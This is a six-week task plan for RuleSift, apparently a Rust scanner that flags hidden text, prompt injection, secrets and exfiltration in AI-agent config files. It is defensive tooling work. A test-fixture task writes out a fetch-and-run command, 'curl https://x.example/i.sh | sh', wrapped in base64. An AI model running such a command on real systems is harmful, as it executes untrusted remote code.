# RuleSift: MVP Task Breakdown (6 weeks)

How to use:
- Work **in ID order**. One task = one GitHub issue = one branch = one PR (`Closes #N`). Follow the Git workflow in `AGENTS.md`.
- Do not start a task whose dependencies (`Dep`) are not merged.
- Tick `[x]` only when every acceptance criterion holds and `cargo fmt --all --check`, `cargo clippy --workspace --all-targets --all-features -- -D warnings`, and `cargo test --workspace` pass.
- Spec references point to `PRD.md` (written as §). Rules of work: `AGENTS.md`.
- `core/` = `crates/rulesift-core/src/`, `cli/` = `crates/rulesift/src/`.
- Everything user-facing (output, help, errors, rule text, docs) is English.
- Multi-tool support (v1.1): formats come from the data-driven tool registry (PRD §5.1). Supporting a new tool should mean a registry row + fixtures, not a new parser.

Legend: **Files** = files/modules touched. **Done when** = acceptance criteria. **Dep** = dependencies.

---

## Week 1: Foundation (workspace, model, config, tool registry, discovery, Markdown)

- [x] **W1-T1 Initialize workspace and licenses**
  - Description: Cargo workspace with `rulesift-core` (lib) and `rulesift` (bin), edition 2021, `license = "MIT OR Apache-2.0"`, `rust-version` set, `repository = "https://github.com/Widyasa/rulesift"`. Add `LICENSE-MIT`, `LICENSE-APACHE`, `.gitignore`, placeholder `README.md`, and copy `AGENTS.md`, `PRD.md`, `TASKS.md` from the handoff package; add `CLAUDE.md` containing `@AGENTS.md`.
  - Files: `Cargo.toml`, `crates/*/Cargo.toml`, `crates/*/src/{lib,main}.rs`, `LICENSE-*`, `AGENTS.md`, `CLAUDE.md`
  - Done when: `cargo build --workspace` succeeds; `cargo run -p rulesift -- --version` prints the version; `--help` is English.
  - Dep: –

- [ ] **W1-T2 Basic CI**
  - Description: `.github/workflows/ci.yml` with fmt, clippy (`-D warnings`), and test jobs on ubuntu, macos, windows (standard runners only).
  - Files: `.github/workflows/ci.yml`
  - Done when: workflow is green on its own PR; no secrets used.
  - Dep: W1-T1

- [x] **W1-T3 Domain model and errors**
  - Description: `FileKind` (8 kinds, §5 F1), `Tool` enum (§5 F1), `Document`, `Segment` + `Scope` (§5 F2), `Severity`, `Tier` (`Block`, `Review`, `Info`, `Ok`, labels `BLOCK`/`REVIEW`/`INFO`/`OK`), `Finding`, `FileReport`, `Report`. `CoreError` with `thiserror`.
  - Files: `core/model.rs`, `core/error.rs`, `core/lib.rs`
  - Done when: all types `Serialize`/`Deserialize`; unit tests for tier thresholds and severity ordering pass.
  - Dep: W1-T1

- [x] **W1-T4 Config `rulesift.toml`**
  - Description: parse §7.1 with `deny_unknown_fields`, defaults, discovery (walk up from first path, `--config`, `RULESIFT_CONFIG`). `[[suppress]]` requires `reason`.
  - Files: `core/config.rs`, `tests/fixtures/config/*`
  - Done when: valid/invalid config fixtures tested; error messages are English and name the bad key.
  - Dep: W1-T3

- [x] **W1-T5 Tool registry**
  - Description: static, data-driven registry (`core/registry.rs`) with one row per MVP path in PRD §5.1: `tool`, `kind`, path glob, parser family, always-loaded predicate id, release (`mvp`/`v0_2`), doc URL. v0.2 rows are present but disabled. Global-only file names are recognized only for explicitly passed paths.
  - Files: `core/registry.rs`
  - Done when: unit test asserts every §5.1 MVP row is present and globs compile; `rulesift --list-tools` (hidden debug flag) or a test snapshot prints the table; adding a row requires no code outside the registry.
  - Dep: W1-T3

- [x] **W1-T6 Discovery and classification**
  - Description: walk paths with `ignore` (include all hidden dirs listed in PRD §5 F1), classify via the tool registry (attach `tool` and `kind`), group skill directories, skip binaries and files > `max_file_size_kib` with warnings, never follow symlinks outside the root, apply include/exclude globs.
  - Files: `core/discovery.rs`, `tests/fixtures/repos/all-tools/**` (one harmless file per MVP registry row)
  - Done when: snapshot of the classified file list (path, tool, kind) for the `all-tools` fixture repo; tests for size limit, binary skip, symlink escape, and exclude globs.
  - Dep: W1-T4, W1-T5

- [x] **W1-T7 Markdown parser to segments**
  - Description: `comrak` with sourcepos; produce `text`, `heading`, `code_block` (with language), `inline_code`, `html_comment`, `link_url`, `image_url` segments with correct line/column. Record the comrak vs pulldown-cmark choice in the PR.
  - Files: `core/parse/markdown.rs`
  - Done when: snapshot of segments for 3 fixtures (plain instructions, skill body, file with HTML comments and images); line numbers verified by tests.
  - Dep: W1-T3

- [x] **W1-T8 Frontmatter parser and skill format rules**
  - Description: split YAML frontmatter, parse with `serde-saphyr` (never `serde_yaml`), validate against the Agent Skills spec; emit RS-FMT-001..005 findings (temporarily as hard-coded checks; they move to YAML rules in W3-T3).
  - Files: `core/parse/frontmatter.rs`, `core/validate/skill.rs`, `tests/fixtures/skills/{valid,invalid-*}/SKILL.md`
  - Done when: one positive and one negative fixture per RS-FMT-001..005; error positions point at the frontmatter line.
  - Dep: W1-T7

---

## Week 2: Shared parser families and normalizers

- [x] **W2-T1 JSON parser with position map**
  - Description: parse JSON with `serde_json`; build a JSON-pointer → (line, column) map with a small scanner; emit `json_string` segments with pointers.
  - Files: `core/parse/json.rs`
  - Done when: tests show correct positions for nested keys, arrays, escaped strings, and CRLF files.
  - Dep: W1-T3

- [x] **W2-T2 MCP normalizer: JSON family**
  - Description: one `McpServer` model (PRD §5 F1) filled from JSON configs with keys `mcpServers` (`.mcp.json`, `.cursor/mcp.json`, `claude_desktop_config.json`, `.roo/mcp.json`, `.kiro/settings/mcp.json`, `.junie/mcp/mcp.json`, `.gemini/settings.json`, `.amazonq/mcp.json`, Continue `*.json`), `servers` (`.vscode/mcp.json`), and `context_servers` (`.zed/settings.json`). Map `trust`/`alwaysAllow` into `auto_trust`/`auto_approve`. RS-FMT-007 for invalid files. Re-check field names against the §5.1 doc links.
  - Files: `core/formats/mcp.rs`, `tests/fixtures/mcp/<tool>/*`
  - Done when: one fixture per JSON source normalizes to the expected `McpServer` list (snapshot) with positions; invalid fixture yields RS-FMT-007.
  - Dep: W2-T1, W1-T6

- [x] **W2-T3 MCP normalizer: TOML (Codex) and YAML (Continue)**
  - Description: parse `.codex/config.toml` `[mcp_servers.*]` (plus `approval_policy`, `sandbox_mode` as settings) and `.continue/mcpServers/*.yaml` block files (`name`, `version`, `schema`, `mcpServers` list) into the same `McpServer` model, with line positions.
  - Files: `core/formats/mcp_toml.rs`, `core/formats/mcp_yaml.rs`, fixtures
  - Done when: fixtures normalize identically to an equivalent JSON fixture (shared snapshot); invalid files yield RS-FMT-007.
  - Dep: W2-T2

- [x] **W2-T4 Hooks normalizer**
  - Description: one `Hook { tool, event, matcher, command, position }` list from Claude Code (`.claude/settings*.json` `hooks`, plugin `hooks/hooks.json`), Cursor (`.cursor/hooks.json`), Windsurf/Devin (`.windsurf/hooks.json`, `.devin/hooks.json`), and Kiro (`.kiro/hooks/*.json`, `action.type = "command"`). Per-tool mapping is data (JSON pointer patterns), not code branches where possible.
  - Files: `core/formats/hooks.rs`, fixtures
  - Done when: snapshot of normalized hooks for each tool's fixture; invalid files yield RS-FMT-007.
  - Dep: W2-T1

- [x] **W2-T5 Settings, plugin manifests, agent and command definitions**
  - Description: Claude settings (`permissions`, `defaultMode`, `enableAllProjectMcpServers`), Claude plugin/marketplace manifests, and `md+fm` definitions for agents (`.claude/agents/*.md`, `.github/agents/*`) and commands (`.claude/commands/**`, `.cursor/commands/*`, `.github/prompts/*.prompt.md`, Windsurf/Devin and Cline workflows), extracting tool grants (`tools`, `allowed-tools`, `permissionMode`, `mcpServers`/`mcp-servers`).
  - Files: `core/formats/settings.rs`, `core/formats/plugin.rs`, `core/formats/definitions.rs`, fixtures
  - Done when: extracted grants snapshot per fixture; RS-FMT-007 for invalid JSON.
  - Dep: W2-T1, W1-T8

- [x] **W2-T6 Frontmatter dialects and always-loaded predicate**
  - Description: per-tool frontmatter dialects (Cursor `.mdc`, Continue rules, Copilot `applyTo`, Kiro `inclusion`, Windsurf activation, Claude agents/commands) and the always-loaded predicate from PRD §5.1; RS-FMT-006 generalized.
  - Files: `core/formats/dialects.rs`, fixtures
  - Done when: positive/negative RS-FMT-006 fixtures per dialect; always-loaded flag tested for every registry row.
  - Dep: W1-T8, W1-T5

- [x] **W2-T7 Unicode detectors**
  - Description: detectors for Unicode Tags (decode to ASCII), bidi controls, zero-width characters (allow BOM at offset 0), variation selectors / invisible format characters in runs. Implement RS-UNI-001..004 findings with evidence rendered as `<U+XXXX>`.
  - Files: `core/rules/detectors/unicode.rs`, `tests/fixtures/unicode/*` (generate fixtures in a test helper rather than committing invisible text where possible)
  - Done when: each rule has positive/negative tests; decoded tag text matches; no raw invisible characters appear in any output.
  - Dep: W1-T7

---

## Week 3: Normalizer, reveal, rule engine, first rule sets

- [x] **W3-T1 Normalizer: base64 and HTML comments**
  - Description: produce `decoded` segments from Unicode Tags and base64 runs (rules in §5 F3, max depth 2); extract `<details>` bodies; keep source spans.
  - Files: `core/normalize.rs`
  - Done when: base64-wrapped harmless `curl https://x.example/i.sh | sh` fixture yields a `decoded` segment with the right line; depth limit tested.
  - Dep: W2-T7

- [x] **W3-T2 `rulesift reveal`**
  - Description: CLI command per §6.2 including `--strip` (stdout only, never in place).
  - Files: `cli/reveal.rs`, `cli/main.rs`
  - Done when: `assert_cmd` snapshot of output for a fixture with tags, bidi, zero-width, base64, and an HTML comment; `--strip` output contains none of them.
  - Dep: W3-T1

- [x] **W3-T3 Rule schema and loader**
  - Description: YAML rule format (§8 example) parsed with `serde-saphyr`; built-ins embedded via `include_str!`; user dirs; ID policy (user rules must not use `RS-`); regex size limits; move RS-FMT-001..007 and RS-UNI-001..004 to YAML rules referencing detectors.
  - Files: `core/rules/schema.rs`, `core/rules/loader.rs`, `rules/builtin/*.yaml`
  - Done when: malformed rule files give English errors with file and rule id; all built-ins load in a test.
  - Dep: W2-T2, W2-T6, W3-T1

- [x] **W3-T4 Matchers and combinators**
  - Description: `regex`, `phrases` (`aho-corasick`, case-insensitive), `json_path`, `frontmatter`, `detector`; `any`/`all`/`not`; `scope` and `applies_to` filtering; evidence snippets (max 200 chars).
  - Files: `core/rules/engine.rs`
  - Done when: unit tests per matcher and combinator; findings sorted deterministically.
  - Dep: W3-T3

- [x] **W3-T5 `rulesift rules list|show|test`**
  - Description: CLI per §6.5; `test` runs `examples.should_match` / `should_not_match`. Add a test that runs every built-in rule's examples.
  - Files: `cli/rules.rs`
  - Done when: all built-in examples pass in CI; `show RS-EXEC-001` snapshot.
  - Dep: W3-T4

- [x] **W3-T6 Hidden-text and injection rules**
  - Description: RS-HID-001..002, RS-INJ-001..004 (§8).
  - Files: `rules/builtin/hid.yaml`, `rules/builtin/inj.yaml`, `tests/fixtures/rules/RS-HID-*/`, `RS-INJ-*/`
  - Done when: one positive and one negative fixture per rule; INJ rules do not fire on code blocks; at least one fixture each for a non-Claude tool (e.g. `GEMINI.md`, `.kiro/steering`).
  - Dep: W3-T5

- [x] **W3-T7 Execution rules**
  - Description: RS-EXEC-001..005.
  - Files: `rules/builtin/exec.yaml`, fixtures
  - Done when: positive/negative fixtures per rule, incl. PowerShell variants and `decoded` scope.
  - Dep: W3-T5

- [x] **W3-T8 Secret rules**
  - Description: RS-SEC-001..003 with an entropy helper; only fake tokens in fixtures (clearly marked `EXAMPLE`, formatted so GitHub push protection is not triggered).
  - Files: `rules/builtin/sec.yaml`, `core/rules/detectors/entropy.rs`, fixtures
  - Done when: fixtures pass; placeholders like `${OPENAI_API_KEY}` and `<your-key>` do not fire.
  - Dep: W3-T5

---

## Week 4: Remaining rules, scoring, suppression, outputs

- [x] **W4-T1 Exfiltration rules**
  - Description: RS-EXF-001..003 incl. `exfil_url` detector (templated or variable query in image/link URLs) and a domain list.
  - Files: `rules/builtin/exf.yaml`, `core/rules/detectors/exfil_url.rs`, fixtures
  - Done when: fixtures pass; static image URLs without query do not fire.
  - Dep: W3-T5

- [x] **W4-T2 MCP and agent-config rules**
  - Description: RS-MCP-001..006, RS-CFG-001..005, operating on the normalized `McpServer`, `Hook`, settings, and definition models so each rule works for every tool.
  - Files: `rules/builtin/mcp.yaml`, `rules/builtin/cfg.yaml`, fixtures
  - Done when: fixtures for every rule across the relevant kinds and at least three different tools per MCP/hook rule; `${VAR}` env references do not trigger RS-MCP-002.
  - Dep: W2-T3, W2-T4, W2-T5, W3-T7

- [x] **W4-T3 Scoring**
  - Description: §9 incl. always-loaded multiplier, toxic-combination bonus, cap, repo score, configurable weights, per-file breakdown.
  - Files: `core/score.rs`
  - Done when: table-driven tests cover each rule of §9 and config overrides.
  - Dep: W4-T2

- [x] **W4-T4 Fingerprints, suppressions, baselines**
  - Description: stable fingerprint (rule id + relative path + normalized evidence, not line number); `[[suppress]]` from config; `--baseline` / `--write-baseline` (JSON file, sorted).
  - Files: `core/suppress.rs`, `core/baseline.rs`
  - Done when: moving a finding to another line keeps its fingerprint; suppressed findings excluded from score but listed as suppressed in JSON.
  - Dep: W4-T3

- [x] **W4-T5 `rulesift scan` with table output and exit codes**
  - Description: wire discovery → parse → normalize → rules → score; flags in §6.1 incl. `--tools` (except `--explain`); table per §10.4; exit codes §6.8.
  - Files: `cli/scan.rs`, `cli/table.rs`
  - Done when: `assert_cmd` snapshots for the `all-tools` repo (no color); exit code tests for each `--fail-on` value and for config errors (2).
  - Dep: W4-T4

- [x] **W4-T6 JSON report and schema**
  - Description: §10.1 with `schema_version: 1`; commit `schemas/report.v1.json`; `--json <FILE>`.
  - Files: `core/report/json.rs`, `schemas/report.v1.json`
  - Done when: output validates against the schema in a test (`jsonschema` dev-dep); each file entry carries `tool` and `kind`; snapshot with redacted `generated_at` and version.
  - Dep: W4-T5

- [x] **W4-T7 SARIF 2.1.0**
  - Description: §10.2 with `serde-sarif`; vendor the SARIF 2.1.0 JSON schema under `tests/schemas/` (note its source and license).
  - Files: `core/report/sarif.rs`
  - Done when: output validates against the schema; levels and `security-severity` mapping tested; paths are relative with `%SRCROOT%`.
  - Dep: W4-T5

- [x] **W4-T8 Markdown (PR comment)**
  - Description: §10.3 incl. marker, truncation at 60,000 chars, `<U+XXXX>` rendering.
  - Files: `core/report/markdown.rs`
  - Done when: snapshots for clean repo, blocked repo, and an oversize report.
  - Dep: W4-T5

---

## Week 5: Change awareness, CI, optional AI

- [x] **W5-T1 `rulesift lock` / `verify`**
  - Description: §6.4 and §7.2 (sorted TOML, CRLF→LF normalization only, skill tree hashes, MCP server fingerprints with redacted env values); RS-LOCK-001..003.
  - Files: `core/lock.rs`, `cli/lock.rs`
  - Done when: tests for change, new file, missing file, CRLF-only change (no violation), and a zero-width-only change (violation).
  - Dep: W4-T5

- [x] **W5-T2 Git diff via `gix`**
  - Description: list changed agent files between `--base` and `--head`/working tree; read file contents at both revisions.
  - Files: `core/git.rs`
  - Done when: tests create temp git repos (`tempfile`) and cover added, modified, deleted, renamed files.
  - Dep: W4-T5

- [ ] **W5-T3 `rulesift diff` capability diff**
  - Description: compute `+`/`-`/`~`/`!` changes per §6.3 from the normalized models, so it works for every tool (MCP servers, hooks, permissions, agent tool grants, allowed-tools, always-loaded flags, new hidden chars/comments/URLs); include in table, JSON `changes`, and Markdown.
  - Files: `core/diff.rs`, `cli/diff.rs`
  - Done when: snapshot of the Page's diff example scenario reproduced from a temp repo; exit code follows `--fail-on` and lock state.
  - Dep: W5-T1, W5-T2, W4-T8

- [ ] **W5-T4 GitHub Action**
  - Description: composite `action.yml` per §12.1 (install pinned release binary, run scan/diff, upload SARIF, upsert PR comment via `actions/github-script`, propagate exit code). Before the first release exists, support `install: source` (builds with `cargo install --path`) for self-testing.
  - Files: `action.yml`, `.github/workflows/self-test.yml`
  - Done when: the self-test workflow runs the action from source on this repo's PRs and uploads SARIF; no secrets other than the automatic `GITHUB_TOKEN`.
  - Dep: W5-T3

- [ ] **W5-T5 `rulesift init` and pre-commit hook**
  - Description: `init` (config), `--ci github`, `--pre-commit` per §6.6; `.pre-commit-hooks.yaml` per §12.2.
  - Files: `cli/init.rs`, `.pre-commit-hooks.yaml`
  - Done when: snapshots of generated files; `--force` behavior tested; hook `files` regex is generated from the tool registry and tested against every MVP path.
  - Dep: W5-T4

- [ ] **W5-T6 MCP server**
  - Description: `rulesift mcp` with `rmcp`, stdio, tools in §11.1, read-only, path escape protection.
  - Files: `cli/mcp.rs`
  - Done when: an in-process client test lists tools and calls `scan_path` and `reveal_file` on fixtures; `..` escape rejected.
  - Dep: W4-T6, W5-T1

- [ ] **W5-T7 `scan --explain` adapters**
  - Description: `AgentAdapter` trait + codex, claude, cursor adapters per §11.2, prompt builder with untrusted-data preface, timeout. Re-check CLI flags against the docs linked in §11.2.
  - Files: `cli/explain/{mod,codex,claude,cursor,prompt}.rs`
  - Done when: snapshot tests of built commands and prompts; output parsing from fixture stdout; tests use fake scripts on a temp `PATH`; real agents only behind `RULESIFT_E2E_AGENT=1` + `#[ignore]`.
  - Dep: W4-T6

- [ ] **W5-T8 `init --agent` and `--print-mcp-config`**
  - Description: §11.3 marked block for `agents`, `claude`, `cursor` (idempotent); print MCP config snippets for Cursor, Claude Code, Codex.
  - Files: `cli/init.rs`
  - Done when: running twice yields identical files; snapshot of printed configs.
  - Dep: W5-T5, W5-T6

---

## Week 6: Multi-tool polish, quality, and release

- [ ] **W6-T1 Supported-tools docs and compatibility fixture**
  - Description: generate `docs/supported-tools.md` from the registry (tool, path, kind, release, doc link); extend `tests/fixtures/repos/all-tools/` so every MVP row has a positive finding; add an end-to-end snapshot of `rulesift scan` on it; re-check each §5.1 doc link and record the date.
  - Files: `docs/supported-tools.md`, `tests/fixtures/repos/all-tools/**`, `tests/registry_docs.rs`
  - Done when: a test fails if the doc is stale vs. the registry; every MVP row appears with at least one finding in the snapshot.
  - Dep: W5-T3

- [ ] **W6-T2 Rule documentation**
  - Description: `docs/rules/<ID>.md` for all 39 rules + 3 lock checks (what, why, example, fix, references, affected tools) in English; a test fails if any built-in rule lacks a doc or the doc lacks a section.
  - Files: `docs/rules/*.md`, `tests/docs.rs`
  - Done when: doc test passes; SARIF `helpUri` points to these files.
  - Dep: W4-T7, W6-T1

- [ ] **W6-T3 False-positive check and tuning**
  - Description: `.github/workflows/fp-check.yml` (weekly + manual) per §14, cloning pinned commits of popular public skill and rules repos (e.g. `anthropics/skills`, `openai/skills`, plus one public repo each with Cursor, Copilot, and Gemini/Kiro rules) into a temp dir; tune rules until no file reaches `block`; record results in `docs/false-positives.md`.
  - Files: `.github/workflows/fp-check.yml`, `scripts/fp-check.sh`, `docs/false-positives.md`
  - Done when: workflow green; measured numbers documented with commit SHAs and date.
  - Dep: W6-T1

- [ ] **W6-T4 cargo-dist configuration**
  - Description: configure targets and installers (shell, PowerShell, npm `rulesift`, Homebrew tap `Widyasa/homebrew-tap`) per §13; release workflow generated by cargo-dist (it will only run when Widya pushes a tag).
  - Files: `Cargo.toml` (`[workspace.metadata.dist]` or `dist-workspace.toml`), `.github/workflows/release.yml`
  - Done when: `dist plan` succeeds locally/CI; `dist build` for the host target works in a PR job; no tag pushed, nothing published.
  - Dep: W6-T3

- [ ] **W6-T5 pip packaging via maturin**
  - Description: `pyproject.toml` with `bindings = "bin"`, package name `rulesift`; CI job that builds wheels (no upload).
  - Files: `pyproject.toml`, `.github/workflows/release.yml`
  - Done when: `maturin build` produces a wheel whose `rulesift --version` works in a fresh venv (CI job).
  - Dep: W6-T4

- [ ] **W6-T6 README, docs, demo**
  - Description: user README (start from the handoff `README.md`), `docs/` (configuration, supported tools, rules index, CI, MCP, explain), `CONTRIBUTING.md`, `SECURITY.md`, `CHANGELOG.md`, and a reproducible demo script (`scripts/demo.sh`) for the `reveal` GIF using harmless fixtures.
  - Files: `README.md`, `docs/*.md`, `CONTRIBUTING.md`, `SECURITY.md`, `CHANGELOG.md`, `scripts/demo.sh`
  - Done when: every command in the README runs against the built binary (or is marked as needing the release); links checked.
  - Dep: W6-T2, W6-T5

- [ ] **W6-T7 Dogfooding**
  - Description: run the Action (from source) on this repo on every PR; prepare `docs/adopt-in-patchsense.md` with the exact workflow file for `Widyasa/patchsense` (do not open PRs in other repos; Widya decides).
  - Files: `.github/workflows/rulesift.yml`, `docs/adopt-in-patchsense.md`
  - Done when: RuleSift scans its own repo green (fixtures excluded via config).
  - Dep: W5-T4

- [ ] **W6-T8 Release v0.1.0 checklist**
  - Description: bump to 0.1.0, fill `CHANGELOG.md`, write `docs/release-checklist.md` (tag, cargo-dist release, crates.io, npm, PyPI, Homebrew tap) with exact commands. Tagging, publishing, and secrets are done by Widya only.
  - Files: `Cargo.toml`, `CHANGELOG.md`, `docs/release-checklist.md`
  - Done when: checklist complete and reviewed; after Widya releases, `npx rulesift --version`, `pip install rulesift`, `brew install widyasa/tap/rulesift`, and `cargo install rulesift` all report 0.1.0.
  - Dep: W6-T6, W6-T7

---

## Summary

| Week | Focus | Tasks |
|---|---|---|
| 1 | Foundation, tool registry, discovery | 8 |
| 2 | Shared parser families and normalizers | 7 |
| 3 | Normalizer, reveal, rule engine, first rules | 8 |
| 4 | Remaining rules, scoring, outputs | 8 |
| 5 | Change awareness, CI, optional AI | 8 |
| 6 | Multi-tool polish, docs, quality, release | 8 |
| **Total** | | **47** |

Critical path: W1-T1 → T3 → T5 → T6 → W2-T1 → T2 → T3 → W3-T3 → T4 → T5 → W4-T2 → T3 → T4 → T5 → W5-T1 → T3 → T4 → W6-T7 → T8. Rule tasks W3-T6 to W4-T1 are independent of each other, and parser tasks W2-T3 to W2-T6 can run in parallel once W2-T1 is merged.
